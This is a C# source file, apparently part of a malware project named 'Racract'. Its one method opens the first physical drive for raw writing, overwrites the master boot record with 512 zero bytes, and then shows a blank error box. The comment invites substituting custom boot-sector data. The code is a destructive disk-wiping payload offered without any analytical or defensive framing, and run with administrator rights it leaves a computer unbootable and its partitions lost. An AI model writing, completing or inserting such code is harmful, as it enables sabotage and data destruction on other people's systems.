using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Racract
{
    internal class MBR
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(
       string lpFileName,
       uint dwDesiredAccess,
       uint dwShareMode,
       IntPtr lpSecurityAttributes,
       uint dwCreationDisposition,
       uint dwFlagsAndAttributes,
       IntPtr hTemplateFile
   );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        const uint GENERIC_WRITE = 0x40000000;
        const uint OPEN_EXISTING = 3;

        public static void StartMBR()
        {
            IntPtr hDisk = CreateFile(@"\\.\PhysicalDrive0", GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (hDisk != IntPtr.Zero)
            {
                byte[] mbrData = new byte[512]; // Replace this with your MBR data (be cautious)
                uint bytesWritten;
                if (WriteFile(hDisk, mbrData, (uint)mbrData.Length, out bytesWritten, IntPtr.Zero))
                {
                    MessageBox.Show("", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}